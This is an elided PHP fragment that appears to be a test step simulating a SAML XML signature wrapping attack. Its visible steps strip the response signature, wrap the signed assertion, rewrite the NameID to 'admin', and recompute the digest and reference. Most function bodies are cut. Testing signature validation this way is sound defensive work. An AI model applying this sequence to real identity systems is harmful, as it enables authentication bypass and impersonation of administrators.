...
public function iExploitTheXMLSignatureBypass()
{
    ...
    // Process nodes
    $this->removeResponseSignature($xpath);
    ...
    // Clone and wrap original assertion
    ...
    // Modify content
    $this->modifyNameId($xpath, 'admin');
    $this->modifyAttributeValue($xpath, 'ADMIN!');

    // Update assertion ID and digest
    $assertion->setAttribute('ID', 'attack');
    $digestValue = $this->calculateDigest($assertion);

    // Update signature reference
    $this->updateSignatureReference($xpath, $assertion, $signature, $digestValue, 'attack');
...
private function removeResponseSignature(DOMXPath $xpath): void
{
...
private function modifyNameId(DOMXPath $xpath, string $newValue): void
{
    $nodes = $xpath->query(
...
private function modifyAttributeValue(DOMXPath $xpath, string $newValue): void
{
    $nodes = $xpath->query(
...
private function updateSignatureReference(
    DOMXPath $xpath,
    ...
    $reference->setAttribute('URI', '#' . $newId);
